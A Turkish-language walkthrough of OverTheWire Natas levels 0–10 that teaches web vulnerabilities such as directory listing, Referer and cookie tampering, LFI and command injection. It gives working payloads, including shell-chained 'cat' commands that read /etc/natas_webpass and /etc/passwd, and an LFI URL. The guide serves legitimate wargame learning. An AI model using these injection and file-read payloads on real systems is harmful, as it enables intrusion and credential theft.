# 🌐 OverTheWire: Natas — Level 0'dan Level 10'a Türkçe Rehber

> Natas tamamen **web güvenliği** üzerine kurulu. SSH yok — her level kendi web sitesi.  
> HTML'den PHP'ye, cookie manipülasyonundan komut enjeksiyonuna kadar web'in temel açıklarını öğreniyorsun.

**URL formatı:** `http://natasX.natas.labs.overthewire.org` (X = level numarası)  
**Başlangıç:** kullanıcı `natas0`, şifre `natas0`  
**Referans:** [mayadevbe.me](https://mayadevbe.me/tags/natas/) (0-6) · [learnhacking.io](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/) (7-10)

---

## 🗺️ Genel Bakış

| Level | Konu | Teknik |
|---|---|---|
| 0 → 1 | HTML kaynak kodu | DevTools / View Source |
| 1 → 2 | Sağ tık engeli | DevTools kısayolu |
| 2 → 3 | Erişilebilir klasörler | Directory listing |
| 3 → 4 | robots.txt | Web crawler bilgisi |
| 4 → 5 | HTTP Referer header | curl / header manipülasyonu |
| 5 → 6 | Cookie manipülasyonu | DevTools Storage |
| 6 → 7 | PHP kaynak kodu | include dosyası okuma |
| 7 → 8 | LFI (Local File Inclusion) | URL parametresi manipülasyonu |
| 8 → 9 | PHP kod tersine çevirme | CyberChef / base64+hex |
| 9 → 10 | Komut enjeksiyonu | passthru() açığı |
| 10 → 11 | Filtreli komut enjeksiyonu | grep çoklu dosya |

**Faydalı araçlar:**
- [CyberChef](https://gchq.github.io/CyberChef/) — Encoding/decoding işlemleri
- [Burp Suite](https://portswigger.net/burp) — HTTP proxy / request manipülasyonu
- `curl` — Komut satırından HTTP isteği
- Tarayıcı DevTools (F12) — Kaynak kodu, cookie, network

---

## Level 0 — HTML Kaynak Kodunu Oku

### 🔐 Giriş
```
URL:      http://natas0.natas.labs.overthewire.org
Kullanıcı: natas0
Şifre:    natas0
```

### 🎯 Görev
Şifre sayfanın bir yerinde gizli.

### 📖 Teori: HTML ve Yorum Etiketi

**HTML (HyperText Markup Language):** Her web sitesinin iskeletidir. Tarayıcı HTML'i işleyip görsel çıktıya dönüştürür. Kullanıcı sayfada görmese de kaynak kodu her zaman okunabilir.

**HTML yorum etiketi:** `<!-- bu kısım tarayıcıda görünmez -->` — Geliştiriciler not almak için kullanır ama hassas bilgi bırakmak tehlikelidir!

Kaynak kodu görmek için:
- `F12` → DevTools → Elements / Inspector
- Sağ tık → "View Page Source"
- `Ctrl+U` (Chrome/Firefox)

### 🔧 Çözüm

```
F12 → Elements sekmesi → HTML içinde arama yap
<!-- The password for natas1 is <ŞİFRE> -->
```

---

## Level 1 → Level 2 — Sağ Tık Engeli

### 🎯 Görev
Sağ tık devre dışı bırakılmış. Yine de kaynak kodu bul.

### 📖 Teori
JavaScript ile sağ tık engellenebilir ama DevTools her zaman açılabilir.

### 🔧 Çözüm

```
F12 tuşuna bas → DevTools açılır (sağ tıka gerek yok)
Elements sekmesinde → HTML yorumunda şifre
```

> 💡 **Ders:** Client-side (tarayıcı tarafı) güvenlik önlemleri her zaman atlatılabilir. Güvenliği asla tarayıcıya bırakma.

---

## Level 2 → Level 3 — Erişilebilir Klasörler

### 🎯 Görev
"Bu sayfada hiçbir şey yok" diyor. Başka bir yere bak.

### 📖 Teori: Web Sunucu Dizin Yapısı

Web sunucusu dosyalar barındırır. URL'deki yol, sunucudaki dosya konumunu gösterir:
```
http://site.com/files/image.png
→ sunucuda /files/image.png konumunda
```

E�er sunucu klasör listelemeye (directory listing) izin veriyorsa:
```
http://site.com/files/
→ klasördeki tüm dosyaları listeler!
```

### 🔧 Çözüm

```
1. F12 → Kaynak kodda img etiketi gör:
   <img src="files/pixel.png">

2. URL'ye git:
   http://natas2.natas.labs.overthewire.org/files/

3. Klasör açık → users.txt görünür

4. http://natas2.natas.labs.overthewire.org/files/users.txt
   → içinde natas3'ün şifresi
```

> 💡 **Ders:** Web sunucularında directory listing kapalı olmalıdır. Açık bırakılırsa saldırganlar tüm dosyaları görebilir.

---

## Level 3 → Level 4 — robots.txt

### 🎯 Görev
Kaynak kodda ipucu: "Google bile bulamayacak". Ne demek istiyor?

### 📖 Teori: robots.txt

**robots.txt:** Web tarayıcılarına (Google, Bing vb.) hangi sayfaların indexlenip indexlenmeyeceğini söyleyen dosya. Her sitede `http://site.com/robots.txt` konumunda olabilir.

```
User-agent: *
Disallow: /gizli-klasor/
```

**ÖNEMLİ:** robots.txt bir güvenlik önlemi DEĞİLDİR! Disallow yazılan sayfalar hâlâ erişilebilir — sadece arama motorlarına "indexleme" deniyor.

### 🔧 Çözüm

```
1. robots.txt'e git:
   http://natas3.natas.labs.overthewire.org/robots.txt

2. Disallow edilen klasörü bul (örn. /s3cr3t/)

3. O klasöre git:
   http://natas3.natas.labs.overthewire.org/s3cr3t/

4. users.txt → şifre
```

---

## Level 4 → Level 5 — HTTP Referer Header Manipülasyonu

### 🎯 Görev
"natas5'ten gelmen gerekiyor" diyor ama sen natas4'tesin. Referer header'ı değiştir.

### 📖 Teori: HTTP Request Headers

Tarayıcı her istekte çeşitli bilgiler gönderir — **HTTP header'ları**. Önemli olanlar:

- `Referer` → isteğin hangi sayfadan geldiği
- `Authorization` → kimlik bilgisi (base64 encoded)
- `Cookie` → oturum bilgisi
- `User-Agent` → tarayıcı bilgisi

Bu header'lar manipüle edilebilir!

```bash
curl "http://natas4.natas.labs.overthewire.org/" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  -u natas4:<şifre>
```

### 🔧 Çözüm — curl ile

```bash
# F12 → Network → isteğe sağ tık → "Copy as cURL"
# Kopyalanan komutu düzenle: Referer'daki 4'ü 5 yap

curl "http://natas4.natas.labs.overthewire.org/" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" \
  -H "Authorization: Basic <base64_kimlik>"
```

### 🔧 Alternatif — Firefox DevTools

```
F12 → Network → isteğe sağ tık → "Edit and Resend"
Referer header'ını natas5 URL'siyle değiştir → Gönder
Response → Raw → şifre
```

---

## Level 5 → Level 6 — Cookie Manipülasyonu

### 🎯 Görev
"Giriş yapmadınız" diyor. Cookie'ye bak.

### 📖 Teori: HTTP Cookie

**Cookie:** HTTP stateless (durumsuz) bir protokol — sunucu oturumları hatırlamaz. Cookie'ler tarayıcıda saklanır ve her istekte sunucuya gönderilir. Oturum bilgisi, tercihleri vb. tutar.

Önemli: Cookie'ler **client-side** saklandığından kullanıcı tarafından değiştirilebilir! Bu büyük bir güvenlik açığıdır.

```
F12 → Storage/Application sekmesi → Cookies → değerleri görebilir ve değiştirebilirsin
```

### 🔧 Çözüm

```
1. http://natas5.natas.labs.overthewire.org/ gir
2. F12 → Storage → Cookies → natas5 sitesi
3. "loggedin" cookie'sini bul → değer: 0
4. Çift tıkla → 1 yap → sayfayı yenile
5. Erişim verildi → şifre görünür
```

> 💡 **Ders:** Güvenlik kontrolleri asla client-side cookie'ye bırakılmamalı. Sunucu tarafında doğrulama şart.

---

## Level 6 → Level 7 — PHP Kaynak Kodu ve Include Dosyası

### 🎯 Görev
Gizli bir değer isteniyor. PHP kaynak kodunu incele.

### 📖 Teori: PHP ve Include

**PHP:** Sunucu tarafında çalışan script dili. Tarayıcı PHP kodu görmez — sadece çıktısını görür. Ama bazen kaynak kodu erişilebilir bırakılır.

`include "dosya.inc"` → başka dosyadan kod/değişken ekler. Bu dosya gizli tutulmazsa, direkt URL ile erişilebilir.

PHP değişkenler `$` ile başlar:
```php
$secret = "gizliDeger";
if($_POST['secret'] == $secret) { ... }
```

### 🔧 Çözüm

```
1. "View sourcecode" linkine tıkla → PHP kodu gör
2. include "includes/secret.inc" satırını bul
3. Direkt git:
   http://natas6.natas.labs.overthewire.org/includes/secret.inc
4. Sayfa boş görünür ama kaynak kodda $secret değerini bul
5. O değeri forma gir → erişim verildi
```

**curl ile:**
```bash
curl 'http://natas6.natas.labs.overthewire.org/' \
  -u natas6:<şifre> \
  --data-raw 'secret=FOEIUWGHFEEUHOFUOIU&submit=Submit'
```

---

## Level 7 → Level 8 — LFI (Local File Inclusion)

### 🎯 Görev
URL'de `?page=home` parametresi var. Bu parametre ile sunucudaki herhangi bir dosyayı okutabilirsin.

### 📖 Teori: Local File Inclusion (LFI)

**LFI:** Sunucu, kullanıcı girdisini doğrulamadan dosya yolu olarak kullandığında ortaya çıkan açık. Saldırgan sunucudaki herhangi bir dosyayı okuyabilir.

Kaynak kodda hint var: şifre `/etc/natas_webpass/natas8` konumunda.

```
http://site.com/index.php?page=home
→ sunucu "home" dosyasını yükler

http://site.com/index.php?page=/etc/passwd
→ sunucu /etc/passwd dosyasını yükler!
```

### 🔧 Çözüm

```
URL'yi değiştir:
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

→ Sayfada natas8'in şifresi görünür
```

> 💡 **Ders:** Kullanıcı girdisi asla doğrudan dosya yolu olarak kullanılmamalı. Input validation şart.

---

## Level 8 → Level 9 — PHP Kod Tersine Çevirme

### 🎯 Görev
Şifre encode edilmiş. Encode fonksiyonunu tersine çevir, orijinal şifreyi bul.

### 📖 Teori: Encode Zincirini Tersine Çevirmek

PHP kaynak kodu:
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Şifreleme sırası: `düz metin → base64 → ters çevir → hex`

Çözme sırası tersine: `hex → ters çevir → base64 decode → düz metin`

### 🔧 Çözüm — CyberChef ile

1. [CyberChef](https://gchq.github.io/CyberChef/) aç
2. "From Hex" işlemi ekle → `3d3d516343746d4d6d6c315669563362` gir
3. "Reverse" işlemi ekle
4. "From Base64" işlemi ekle
5. Sonuç: `oubWYf2kBq`

**Komut satırı ile:**
```bash
echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
```

O değeri forma gir → şifre verilir.

---

## Level 9 → Level 10 — Komut Enjeksiyonu (Command Injection)

### 🎯 Görev
Arama kutusu var, PHP `grep` komutu çalıştırıyor. Kendi komutunu enjekte et.

### 📖 Teori: Command Injection

PHP kaynak kodu:
```php
passthru("grep -i $key dictionary.txt");
```

`passthru()` → sistem komutunu çalıştırır ve çıktısını direkt gösterir. `$key` kullanıcı girdisi — hiç filtrelenmemiş!

Linux'ta `;` ile birden fazla komut zincirlenebilir:
```bash
grep -i test dictionary.txt ; ls -la ; cat /etc/passwd
```

### 🔧 Çözüm

Arama kutusuna yaz:
```
; cat /etc/natas_webpass/natas10;
```

Bu çalıştırılacak komut:
```bash
grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt
```

→ Şifre sayfada görünür!

> 💡 **Ders:** Kullanıcı girdisi asla direkt komuta dahil edilmemeli. `escapeshellarg()` veya whitelist kullan.

---

## Level 10 → Level 11 — Filtreli Komut Enjeksiyonu

### 🎯 Görev
Artık `;`, `|`, `&` karakterleri filtreleniyor. Farklı bir yöntem bul.

### 📖 Teori: Filtreyi Atlatmak

PHP kodu:
```php
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

`;`, `|`, `&` yok ama boşluk serbest! `grep` birden fazla dosyada arama yapabilir:
```bash
grep -i PATTERN dosya1 dosya2
```

Bunu kullanarak şifre dosyasını direkt arama kapsamına alabiliriz.

### 🔧 Çözüm

Arama kutusuna yaz:
```
.* /etc/natas_webpass/natas10
```

Bu çalıştırılacak komut:
```bash
grep -i .* /etc/natas_webpass/natas10 dictionary.txt
```

`.*` tüm satırlarla eşleşir → şifre dosyasının tüm içeriği çıkar!

> 💡 **Ders:** Blacklist (yasaklı karakter listesi) yetersizdir. Whitelist (izinli karakter listesi) kullan.

---

## 📚 Öğrenilen Web Güvenliği Kavramları

| Kavram | Açıklama |
|---|---|
| **View Source** | HTML kaynak kodunu görme |
| **HTML Comment** | `<!-- -->` içindeki gizli bilgiler |
| **Directory Listing** | Klasör içeriğinin görünür olması |
| **robots.txt** | Crawler yönlendirmesi — güvenlik değil! |
| **HTTP Headers** | Referer, Cookie, Authorization vb. |
| **Cookie Manipülasyonu** | Client-side değerleri değiştirme |
| **PHP Include** | Dışarıdan kod ekleme — gizli dosya riski |
| **LFI** | Local File Inclusion — dosya yolu enjeksiyonu |
| **Kod Tersine Çevirme** | Encode zincirini geri çözme |
| **Command Injection** | Kullanıcı girdisiyle sistem komutu çalıştırma |
| **Filtre Atlatma** | Blacklist yetersizliğini kullanma |

## 📚 Kullanılan Araçlar

| Araç | Ne için |
|---|---|
| `F12` (DevTools) | Kaynak kodu, cookie, network |
| `curl` | Komut satırından HTTP isteği |
| [CyberChef](https://gchq.github.io/CyberChef/) | Encoding/decoding zincirleri |
| `Ctrl+U` | Hızlı kaynak kodu görüntüleme |

---

## 🔗 Faydalı Kaynaklar

- [OverTheWire Natas](https://overthewire.org/wargames/natas/)
- [MayADevBe Natas Walkthrough](https://mayadevbe.me/tags/natas/) (Level 0-6)
- [LearnHacking.io Natas 6-10](https://learnhacking.io/overthewire-natas-walkthrough-levels-6-10/)
- [W3Schools HTML](https://www.w3schools.com/html/) — HTML temelleri
- [W3Schools PHP](https://www.w3schools.com/php/) — PHP temelleri
- [MDN HTTP Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview) — HTTP protokolü
- [CyberChef](https://gchq.github.io/CyberChef/) — Her türlü encode/decode
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — En yaygın web açıkları

---

**Sonraki bölüm:** [natas_11-20.md](./natas_11-20.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
